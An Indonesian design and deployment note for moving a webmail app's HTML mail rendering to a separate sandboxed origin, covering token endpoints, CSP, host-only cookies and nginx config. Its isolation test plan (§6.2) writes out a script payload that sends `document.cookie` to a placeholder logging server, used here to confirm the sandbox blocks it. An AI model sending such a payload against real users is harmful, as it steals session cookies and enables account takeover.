# Rencana: origin terpisah untuk render HTML mail

Status: **LIVE sejak 2026-11-05 ~23:45 WIB** — DNS subdomain konten,
sertifikat, dan vhost nginx sudah ada, dan `MAIL_CONTENT_ORIGIN` sudah
disetel di environment `iris-api` (systemd `iris-api`,
`127.0.0.1:8000`). Dokumen ini sekarang adalah catatan implementasi +
sisa pekerjaan, bukan lagi rencana yang menunggu persetujuan. Satu
langkah masih terbuka: build web belum dibaking dengan
`VITE_MAIL_CONTENT_ORIGIN`, jadi browser masih memakai fallback
`srcdoc` (lihat §5).

Subdomain yang diusulkan: **`mail-content.example.com`**
App origin tetap: `https://mail.example.com`

## 1. Masalah yang diselesaikan

HTML mail hari ini dirender di origin yang sama dengan aplikasi, sebagai
`srcdoc` di dalam `<iframe sandbox="">`. Sandbox tanpa `allow-same-origin`
sudah membuat frame itu opaque origin, dan meta-CSP di dalamnya memblokir
script — tapi seluruh pertahanan itu masih satu origin dengan sesi pengguna.
Satu celah (misalnya perubahan sandbox di masa depan, atau quirk browser)
sudah cukup untuk membuat HTML mail yang jahat menyentuh cookie sesi,
CSRF token, dan DOM aplikasi. Origin terpisah memindahkan HTML mail ke
origin yang tidak punya apa-apa: tidak ada cookie, tidak ada kredensial,
tidak ada akses ke aplikasi.

Checklist yang ditutup rencana ini: `docs/07-PRODUCTION-READINESS.md` —
"Separate origin for HTML mail rendering (TRD §6 'where feasible')".

## 2. Keadaan sekarang (terverifikasi 2026-11-05)

- `apps/web/src/main.ts` — `messageBody()` (baris ~249): iframe
  `srcdoc: <meta CSP> + m.html_body`, `sandbox=""`,
  `referrerpolicy="no-referrer"`. Meta-CSP:
  `default-src 'none'; script-src 'none'; ...; style-src 'unsafe-inline';
  img-src data: cid: [https:]`. Gambar remote diblokir sampai pengguna
  menekan "Load images once", yang me-render ulang frame dengan
  `img-src ... https:`.
- Cookie sesi di `crates/auth/src/lib.rs` — `set_cookie()`:
  `iris_session=...; Path=/; HttpOnly; SameSite=Strict; Max-Age=...` —
  **tanpa atribut `Domain=`**, jadi host-only untuk `mail.example.com`.
  Cookie CSRF (`set_csrf_cookie()`) juga tanpa `Domain=`, `SameSite=Strict`.
  Verifikasi ini penting: cookie TIDAK akan terkirim ke subdomain mana
  pun, dan itu yang diinginkan — jangan pernah menambahkan
  `Domain=.example.com`.
- `deploy/nginx/iris-headers.conf` tidak memasang CSP di halaman utama
  (komentar di file: IRIS memuat Google Fonts, dan srcdoc mewarisi CSP
  halaman — `style-src` yang ketat akan merusak render mail). Snippet yang
  sama memasang `X-Frame-Options: DENY` — lihat jebakan di §5, poin 3.
- `apps/web/index.html` memakai inline script (early fetch
  `/api/v1/session` + `/api/v1/mailboxes` sebelum bundle dimuat). Itu
  sebabnya CSP halaman utama tidak bisa dipasang begitu saja — lihat §7.
- Endpoint terkait sudah ada: `GET /api/v1/mailboxes/:id/messages/:id`
  (JSON berisi `html_body`), `.../raw`, `.../attachments/:id`.
  Temp inbox memakai reader yang sama (`openMessageAt`) dengan auth
  header sendiri.

## 3. Keputusan desain

### 3.1 Dipilih: endpoint khusus + token satu-kali (sudah disiapkan kodenya)

Alur saat origin terpisah aktif:

1. Pengguna membuka pesan. Web (origin aplikasi) sudah punya `html_body`
   dari endpoint pesan biasa — tetapi TIDAK mengirim string itu ke frame.
2. Web memanggil `POST /api/v1/mailboxes/:mb/messages/:id/html-body-token`
   `{allow_remote: false}` (di balik sesi + CSRF, seperti endpoint lain).
   Server mengambil ulang pesan via JMAP (pola yang sama dengan
   `get_message_raw`), menyimpan `html_body` di memori proses di bawah
   token acak 64 hex (`auth::new_token()`), dan menjawab
   `{url: "https://mail-content.example.com/api/v1/mailboxes/:mb/messages/:id/html-body?t=<token>"}`.
3. Web memasang iframe `<iframe src="<url>" sandbox="" referrerpolicy="no-referrer">`.
   Nginx vhost `mail-content.example.com` hanya mem-proxy path itu ke
   `iris-api` di `127.0.0.1:8000`.
4. `GET .../html-body?t=<token>` (tanpa sesi, tanpa cookie) mengambil
   body dari store, **menghapus token pada pemakaian pertama** — benar
   atau salah pesan — lalu menjawab `text/html` dengan header CSP yang
   sama dengan meta-CSP srcdoc hari ini, `Cache-Control: no-store`,
   `X-Content-Type-Options: nosniff`. Token kedaluwarsa 120 detik.
   Token tidak dikenal / kedaluwarsa / pesan salah → 404 yang sama
   dengan body yang memang tidak ada.
5. "Load images once" me-mint token baru dengan `{allow_remote: true}`
   dan mengganti `src` iframe (CSP jawaban berubah menjadi
   `img-src data: cid: https:`).

Kenapa desain ini:

- **Tidak ada kredensial yang menyeberang origin.** Serve endpoint tidak
  bisa memakai cookie sesi (host-only, tidak terkirim ke subdomain) dan
  memang tidak membutuhkannya: token adalah indeks ke store di memori
  server, bukan kredensial mail. Token bocor pun hanya membuka satu body
  mail selama ≤120 detik, bukan kredensial JMAP pengguna.
- **CSP lewat header HTTP, bukan `<meta>`.** Lebih kuat dan tidak
  bergantung pada string yang disisipkan web.
- **Tidak ada state baru di disk.** Store in-memory, batas 512 entri
  tertunda, prune entri kedaluwarsa setiap mint/claim. Restart service
  hanya membatalkan URL yang sedang tertunda; web jatuh kembali ke
  srcdoc (lihat §4).
- **Fallback aman.** Mint gagal (origin belum dikonfigurasi, 409; network
  error; token habis) → web me-render srcdoc seperti hari ini. Pengguna
  tetap melihat mail; tidak ada layar kosong.

### 3.2 Dipertimbangkan dan TIDAK dipilih: postMessage ke halaman penerima

Alternatifnya: halaman statis `mail-frame.html` di origin konten yang
menerima `html_body` lewat `postMessage` dari aplikasi, lalu menyuntikkan
ke iframe srcdoc bersarang di dalamnya.

Alasan ditolak:

- Halaman penerima butuh script sendiri untuk mendengarkan `postMessage`,
  sementara CSP-nya harus tetap memblokir script dari mail — dua
  kebutuhan itu bertabrakan di satu dokumen (butuh `script-src 'self'` /
  hash + iframe bersarang, sedangkan endpoint khusus memisahkan keduanya
  dengan bersih: halaman penerima tidak ada, yang ada hanya dokumen mail
  dengan header CSP).
- Validasi `event.origin` butuh tahu app origin di halaman statis —
  berarti build-time injection (`%VITE_SITE_URL%`) atau halaman itu
  bisa di-frame situs lain untuk me-render HTML sembarang di origin
  konten. Endpoint token tidak punya masalah ini: yang memegang token
  hanyalah yang sudah login.
- String HTML besar lewat `postMessage` + race `iframe.onload` vs kirim
  adalah permukaan bug baru; endpoint `src` adalah pola browser yang
  standar (prinsip yang sama dengan URL pre-signed).

### 3.3 Yang TIDAK diubah oleh desain ini

- **Cookie sesi tetap host-only.** Tidak ada `Domain=.example.com`.
  Menambahkan itu justru membocorkan sesi ke origin konten dan
  menggagalkan seluruh tujuan pemisahan.
- **`style-src 'unsafe-inline'` tetap ada**, baik di meta-CSP srcdoc
  maupun di CSP endpoint baru. Mail HTML sungguhan bergantung pada inline
  style; menghapusnya merusak render sebagian besar HTML mail. Bukti
  browser belum ada yang menunjukkan penghapusan itu aman.
- **Tidak ada CSP di halaman utama (nginx).** Butuh refactor inline
  script di `index.html` dulu (early fetch + nonce/hash). Itu pekerjaan
  terpisah, bukan bagian slice ini.
- **Temp inbox tetap srcdoc** sampai ada endpoint mint untuknya
  (follow-up, lihat §6). Kode web memang dirancang begitu: hanya mailbox
  permanen yang mendapat minter token.

## 4. Kode yang sudah disiapkan (slice ini, flag-gated)

Tanpa subdomain pun semua ini compile dan tes lolos, dan perilaku live
tidak berubah: default semua flag kosong/mati.

| File | Perubahan |
|---|---|
| `crates/config/src/lib.rs` | `Config.mail_content_origin: String` dari `MAIL_CONTENT_ORIGIN`, lewat `normalize_mail_content_origin()` (pure, teruji): kosong = mati; selain itu harus origin telanjang `https://host[:port]` — tanpa path/query/fragment/userinfo; `http://` hanya untuk loopback (dev). Nilai tidak valid fail-closed ke kosong. |
| `crates/config/src/limits.rs` | `MAX_HTML_BODY_BYTES = 5_000_000`, `HTML_BODY_TOKEN_TTL_SECS = 120`, `MAX_PENDING_HTML_BODIES = 512` (+ `values_are_unchanged`). |
| `apps/api/src/html_body.rs` (baru) | `HtmlBodyStore` in-memory (mint/claim satu-kali + prune), `mail_body_csp(allow_remote)` — sama persis dengan meta-CSP srcdoc hari ini — dan `html_body_url()`. Unit test: mint→claim sekali, claim salah pesan/mailbox membakar token, token tak dikenal, kesetaraan CSP, bentuk URL. |
| `apps/api/src/main.rs` | `POST /api/v1/mailboxes/:mailbox_id/messages/:message_id/html-body-token` (di balik `require_session` + CSRF; 409 `mail_content_origin_not_configured` bila flag kosong; 404 bila tidak ada `html_body`; 413 bila body > 5 MB; 429 bila store penuh) dan `GET .../html-body?t=` (publik, tanpa sesi; 404 untuk token tak dikenal/kedaluwarsa/salah pesan). |
| `.env.example` | `MAIL_CONTENT_ORIGIN=` (kosong, berkomentar). |
| `apps/web/vite.config.ts` | Default `VITE_MAIL_CONTENT_ORIGIN: ''`. |
| `apps/web/src/site.ts` | `SITE.mailContentOrigin` dari `import.meta.env`. |
| `apps/web/src/main.ts` | `messageBody(m, mintUrl?)` menjadi async; bila minter ada, iframe memakai `src` dari token URL (tetap `sandbox=""`, `referrerpolicy="no-referrer"`); bila mint gagal → fallback srcdoc. `openMessageAt()` meneruskan minter; hanya caller mailbox permanen yang memasang `htmlBodyMinter(messageUrl)`; temp inbox tidak memasang apa-apa. |

Perilaku bila flag mati: `VITE_MAIL_CONTENT_ORIGIN` kosong →
`htmlBodyMinter()` mengembalikan `undefined` → `messageBody` persis
seperti sebelumnya. `MAIL_CONTENT_ORIGIN` kosong → endpoint mint
menjawab 409 dan tidak pernah dipanggil web. Keadaan live hari ini:
flag server sudah hidup (`MAIL_CONTENT_ORIGIN` disetel), tetapi flag
web belum — build web yang ter-deploy tidak mengandung origin konten,
jadi browser masih memakai `srcdoc` sampai web di-build ulang dengan
flag itu (lihat §5, langkah 5).

## 5. Langkah infra — SELESAI kecuali langkah 5 (live 2026-11-05)

Langkah 1–4 dan 6 sudah dikerjakan saat deploy 2026-11-05 ~23:45 WIB:
DNS subdomain konten menunjuk ke VPS, sertifikat ECDSA terbit, vhost
nginx aktif (hanya mem-proxy path render HTML ke `iris-api` di
`127.0.0.1:8000`; `/` menjawab 404), dan `MAIL_CONTENT_ORIGIN`
disetel di environment `iris-api`. Tersisa langkah 5 — build web
dengan flag — sebelum browser memakai origin terpisah.

1. **DNS — SELESAI.** `mail-content.example.com` → A/AAAA ke IP VPS yang
   sama dengan `mail.example.com` (atau CNAME ke `mail.example.com` bila
   itu pola yang dipakai). Verifikasi: `dig +short mail-content.example.com`
   menjawab IP VPS.
2. **Sertifikat — SELESAI.** Sertifikat ECDSA untuk nama itu mengikuti pola
   `mail.example.com` (saat ini Let's Encrypt via certbot). Verifikasi:
   `curl -I https://mail-content.example.com/` menjawab 404 (bukan
   error TLS) sebelum vhost dipasang.
3. **Vhost nginx baru — SELESAI.** Draf di bawah ini yang diterapkan
   (disimpan sebagai `/etc/nginx/sites-available/mail-content.example.com`
   dan diaktifkan); bandingkan dengan vhost live sebelum mengubahnya:

   ```nginx
   # Diterapkan 2026-11-05 (draf ini yang dipakai).
   server {
       server_name mail-content.example.com;
       include /etc/nginx/snippets/cloudflare-realip.conf;

       # JANGAN include iris-headers.conf di sini: X-Frame-Options: DENY
       # di snippet itu akan memblokir iframe dari mail.example.com.
       # Sebagai gantinya, frame-ancestors di bawah yang hanya mengizinkan
       # app origin — dan hanya untuk path render ini.
       add_header X-Content-Type-Options "nosniff" always;
       add_header Referrer-Policy "no-referrer" always;
       add_header Strict-Transport-Security "max-age=31536000" always;

       # Satu-satunya path yang di-proxy: endpoint render HTML.
       # Tidak ada /api lain, tidak ada /auth, tidak ada file statis
       # aplikasi — vhost ini TIDAK menyajikan /srv/iris/dist (kalau
       # disajikan, halaman login pun akan hidup di origin konten).
       location ~ ^/api/v1/mailboxes/[^/]+/messages/[^/]+/html-body$ {
           # CSP kedua: hanya frame-ancestors. CSP dari API (tanpa
           # frame-ancestors) tetap berlaku berdampingan — browser
           # menegakkan keduanya.
           add_header Content-Security-Policy "frame-ancestors https://mail.example.com" always;
           limit_req zone=mail_content burst=5 nodelay;
           proxy_pass http://127.0.0.1:8000;
           proxy_http_version 1.1;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
       }

       location / { return 404; }

       listen 443 ssl;
       ssl_certificate /etc/letsencrypt/live/mail-content.example.com/fullchain.pem;
       ssl_certificate_key /etc/letsencrypt/live/mail-content.example.com/privkey.pem;
       include /etc/letsencrypt/options-ssl-nginx.conf;
       ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
   }

   server {
       if ($host = mail-content.example.com) {
           return 301 https://$host$request_uri;
       }
       server_name mail-content.example.com;
       listen 80;
       return 404;
   }
   ```

   Catatan draf: `limit_req_zone mail_content` (misal `10r/m` per IP)
   harus didefinisikan di konteks `http` nginx; nilai pastinya diputuskan
   saat deploy. `nginx -t` sebelum reload; `systemctl reload nginx`.
4. **Konfigurasi service — SELESAI.** Di environment iris-api (systemd unit /
   secret file yang sama dengan `SESSION_SECRET`, bukan di repo):
   `MAIL_CONTENT_ORIGIN=https://mail-content.example.com`.
   Restart `iris-api` (deploy biasa) agar config terbaca.
5. **Build web dengan flag — TERBUKA.** `VITE_MAIL_CONTENT_ORIGIN=https://mail-content.example.com`
   saat `npm run build` (pola deploy sandbox-built release yang sudah
   dipakai), lalu deploy dist seperti biasa. Tanpa langkah ini web tetap
   srcdoc meskipun server sudah siap — kedua flag harus hidup bersamaan.
6. **Smoke test pasca-deploy — SEBAGIAN SELESAI** (pemeriksaan origin,
   lihat §6), lalu centang checklist di
   `docs/07-PRODUCTION-READINESS.md`.

## 6. Verifikasi — infra live, pemeriksaan browser MASIH TERBUKA

Infra (§5) sudah live. Yang sudah terverifikasi di origin (2026-11-05):
`/` di origin konten menjawab 404, `html-body` tanpa token menjawab
404 dengan header `frame-ancestors`, dan app origin tetap menjawab 200
di `/ready`. Pemeriksaan browser di bawah ini belum diuji — jangan
klaim sudah teruji sebelum dilakukan.

### 6.1 Cookie tidak bocor ke subdomain

1. Login di `mail.example.com`. DevTools → Application → Cookies:
   `iris_session` dan `iris_csrf` tampil **tanpa kolom Domain**
   (host-only) di `mail.example.com`.
2. Buka satu HTML mail (mode `src` aktif). DevTools → Network:
   request `GET .../html-body?t=...` ke `mail-content.example.com`
   **tidak membawa header `Cookie`**, dan responsnya tidak membawa
   `Set-Cookie`.
3. DevTools → Application → Cookies untuk origin
   `mail-content.example.com`: kosong setelah membuka mail.
4. Uji negatif: ubah satu cookie menjadi `Domain=.example.com` secara
   sengaja di staging/dev dan pastikan pemeriksaan di atas menangkapnya
   (cookie muncul di origin konten). Di produksi nilai itu tidak boleh
   ada.

### 6.2 Kebocoran / isolasi

1. Kirim ke diri sendiri mail HTML berisi
   `<script>fetch('https://<server-catat>/'+document.cookie)</script>`,
   `<img src="https://<server-catat>/x">`, dan
   `<a href="https://example.invalid">` + skrip yang mencoba
   `parent.document`. Buka di mode `src`: server pencatat tidak menerima
   apa pun sebelum "Load images once"; setelah itu hanya request gambar
   (tanpa cookie); akses `parent.document` melempar (opaque origin).
2. Token URL dipakai dua kali → pemakaian kedua 404. Token dipakai
   untuk pesan lain (`message_id` berbeda di path) → 404. Token dipakai
   >120 detik setelah mint → 404.
3. Token URL dibuka langsung di tab baru: me-render HTML mail, tetapi
   Application → Cookies origin konten tetap kosong dan tidak ada
   request ke `/api/` lain dari tab itu.
4. Header respons `html-body`: `Content-Security-Policy` sama dengan
   meta-CSP lama (bandingkan string), `Cache-Control: no-store`,
   `X-Content-Type-Options: nosniff`, dan `Content-Security-Policy:
   frame-ancestors https://mail.example.com` dari nginx.

### 6.3 Paritas render

Bandingkan pesan yang sama dalam dua mode (flag web mati = srcdoc,
flag web hidup = `src`), di desktop + satu ponsel:

- Inline style, tabel, dan layout mail tampil sama (perbandingan visual,
  bukan klaim "persis" tanpa melihat).
- Bar "Remote images blocked" muncul bila ada `<img src="http(s):…">`;
  "Load images once" memuat gambar remote di kedua mode.
- Mail tanpa `html_body` (teks saja) tetap `<pre class="mail-text">`;
  mail tanpa body tetap menampilkan catatan lampiran + "View original".
- Temp inbox tetap srcdoc (tidak ada regresi di sana).
- Pesan dengan `html_body` > 5 MB: mint menjawab 413 dan web jatuh
  kembali ke srcdoc (bukan layar kosong).

## 7. Yang sengaja TIDAK dilakukan (dan kenapa)

- **Menghapus `style-src 'unsafe-inline'`.** Akan merusak render HTML
  mail — mail sungguhan bergantung pada inline style. Tidak dilakukan
  tanpa bukti browser bahwa penghapusan itu aman.
- **CSP halaman utama di nginx.** Butuh refactor inline script dulu
  (`index.html`: early fetch; kemungkinan inline lain di partial).
  Sampai inline script dipindah ke file eksternal + nonce/hash, CSP
  halaman utama akan memblokir aplikasi sendiri. Pekerjaan terpisah.
- **Endpoint mint untuk temp inbox.** Temp inbox memakai auth header
  sendiri (`x-temp-token`); mint-nya butuh varian route + store yang
  terikat ke inbox id, bukan `CurrentUser`. Sengaja ditunda: temp inbox
  tetap srcdoc dan tidak regresi.
- **Rate limit per-IP di endpoint serve.** Token 64-hex (256-bit, acak)
  tidak bisa ditebak; tebakan salah hanya 404 tanpa bocor info. Per-IP
  `limit_req` disiapkan di draf vhost (§5 poin 3) sebagai pertahanan
  tambahan saat deploy, bukan di kode API slice ini.
- **Mengubah `X-Frame-Options` global.** Snippet header bersama tetap
  `DENY` untuk app origin; vhost konten sengaja tidak memakai snippet
  itu (jebakan §5 poin 3), bukan mengubah snippet bersama.

## 8. Batasan yang diketahui

- Store satu proses: bila nanti ada dua instance `iris-api` di belakang
  load balancer, token yang di-mint di satu instance tidak dikenal
  instance lain (web fallback ke srcdoc). Hari ini hanya satu instance
  systemd, jadi bukan masalah.
- `html_body` diambil ulang via JMAP saat mint (satu round-trip ekstra
  per pesan yang dibuka, dihitung dalam `check_read_limit` yang sama
  seperti read lain).
- `cid:` image di dalam mail tetap tidak me-resolve menjadi lampiran
  (sama seperti perilaku srcdoc hari ini — bukan regresi, bukan
  perbaikan).
- Frame `src` tetap memakai `sandbox=""` tanpa `allow-scripts` /
  `allow-same-origin`. Menambah salah satunya akan membatalkan isolasi
  dan dilarang tanpa review keamanan.
